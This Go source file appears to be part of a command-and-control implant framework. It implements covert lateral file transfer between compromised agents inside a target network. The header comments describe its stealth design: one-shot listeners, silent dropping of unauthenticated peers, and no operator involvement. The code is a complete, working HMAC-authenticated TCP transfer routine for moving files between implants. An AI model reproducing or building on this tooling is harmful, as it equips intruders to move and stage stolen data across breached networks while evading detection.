// Lateral transfer (mothership): agent<->agent file moves inside the target
// network, coordinated ONLY over Type1 by the teamserver (docs/LATERAL.md).
// Stealth rules: one-shot listener (single accept then closed), PSK-bound
// proof on the wire, no operator involvement, listener dies with the transfer.
package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"hash"
	"io"
	"log"
	"net"
	"os"
	"time"

	"wispp/protocol"
)

func xferProof(psk, nonce string) string {
	m := hmac.New(sha256.New, []byte(psk))
	m.Write([]byte("xfer|" + nonce))
	return hex.EncodeToString(m.Sum(nil))
}

// xferServe binds a single-accept TCP listener, streams the file, tears down.
// Returns the bound addr immediately (listener runs in background).
func xferServe(a *protocol.XferServeArgs, psk string) (string, error) {
	ln, err := net.Listen("tcp", a.Addr)
	if err != nil {
		return "", err
	}
	addr := ln.Addr().String()
	go func() {
		res := protocol.XferServeResult{Addr: addr}
		defer func() {
			_ = ln.Close()
			log.Printf("xfer: serve %s done (%d bytes), listener closed", addr, res.Bytes)
		}()
		_ = ln.(*net.TCPListener).SetDeadline(time.Now().Add(5 * time.Minute))
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(5 * time.Minute))
		// peer proof first
		var lb [4]byte
		if _, err := io.ReadFull(conn, lb[:]); err != nil {
			return
		}
		pl := binary.BigEndian.Uint32(lb[:])
		if pl == 0 || pl > 256 {
			return
		}
		proof := make([]byte, pl)
		if _, err := io.ReadFull(conn, proof); err != nil {
			return
		}
		if !hmac.Equal(proof, []byte(xferProof(psk, a.Nonce))) {
			return // unauthenticated peer: drop silently
		}
		f, err := os.Open(a.Path)
		if err != nil {
			return
		}
		defer f.Close()
		buf := make([]byte, 256*1024)
		hdr := make([]byte, 4)
		var n int64
		for {
			r, rerr := f.Read(buf)
			if r > 0 {
				binary.BigEndian.PutUint32(hdr, uint32(r))
				if _, werr := conn.Write(hdr); werr != nil {
					return
				}
				if _, werr := conn.Write(buf[:r]); werr != nil {
					return
				}
				n += int64(r)
			}
			if rerr != nil {
				break
			}
		}
		binary.BigEndian.PutUint32(hdr, 0) // EOF marker
		_, _ = conn.Write(hdr)
		res.Bytes = n
	}()
	return addr, nil
}

// xferFetch dials a serving agent, proves, and writes the stream to local.
func xferFetch(a *protocol.XferFetchArgs, psk string) (*protocol.XferFetchResult, error) {
	conn, err := net.DialTimeout("tcp", a.Addr, 15*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Minute))
	proof := []byte(xferProof(psk, a.Nonce))
	var lb [4]byte
	binary.BigEndian.PutUint32(lb[:], uint32(len(proof)))
	if _, err := conn.Write(lb[:]); err != nil {
		return nil, err
	}
	if _, err := conn.Write(proof); err != nil {
		return nil, err
	}
	tmp := a.Local + ".part"
	out, err := os.Create(tmp)
	if err != nil {
		return nil, err
	}
	h := sha256.New()
	var n int64
	var hdr [4]byte
	buf := make([]byte, 256*1024)
	for {
		if _, err := io.ReadFull(conn, hdr[:]); err != nil {
			out.Close()
			os.Remove(tmp)
			return nil, err
		}
		cl := binary.BigEndian.Uint32(hdr[:])
		if cl == 0 {
			break
		}
		if int64(cl) > int64(len(buf)) {
			out.Close()
			os.Remove(tmp)
			return nil, fmt.Errorf("chunk too large: %d", cl)
		}
		if _, err := io.ReadFull(conn, buf[:cl]); err != nil {
			out.Close()
			os.Remove(tmp)
			return nil, err
		}
		out.Write(buf[:cl])
		h.Write(buf[:cl])
		n += int64(cl)
	}
	out.Close()
	if err := os.Rename(tmp, a.Local); err != nil {
		os.Remove(tmp)
		return nil, err
	}
	return &protocol.XferFetchResult{Bytes: n, SHA256: hexDigest(h)}, nil
}

func hexDigest(h hash.Hash) string { return hex.EncodeToString(h.Sum(nil)) }

func xferResult(v any) protocol.TaskResult {
	b, _ := json.Marshal(v)
	return protocol.TaskResult{OK: true, Output: string(b)}
}
